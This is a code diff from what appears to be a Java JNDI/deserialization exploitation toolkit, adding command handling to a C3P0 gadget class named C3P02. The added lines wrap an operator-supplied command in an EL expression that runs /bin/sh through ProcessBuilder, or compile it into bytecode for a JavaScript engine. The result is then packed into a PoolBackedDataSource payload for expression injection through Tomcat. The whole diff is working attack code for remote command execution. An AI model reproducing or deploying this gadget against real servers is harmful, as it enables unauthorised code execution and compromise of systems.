@@ -18,6 +18,9 @@ import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
+import static com.qi4l.jndi.gadgets.utils.Utils.getJSEngineValue;
+import static com.qi4l.jndi.gadgets.utils.handle.GlassHandler.generateClass;
+
 /**
  * C3P02 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
  */
@@ -27,6 +30,12 @@ import java.util.logging.Logger;
 public class C3P02 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
+        if (command.startsWith("EX-") || command.startsWith("LF-")) {
+            command = getJSEngineValue(generateClass(command).toBytecode()).replace("\"", "\\\"");
+        } else {
+            command = "new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + command + "']).start()";
+        }
+
         PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
         return b;
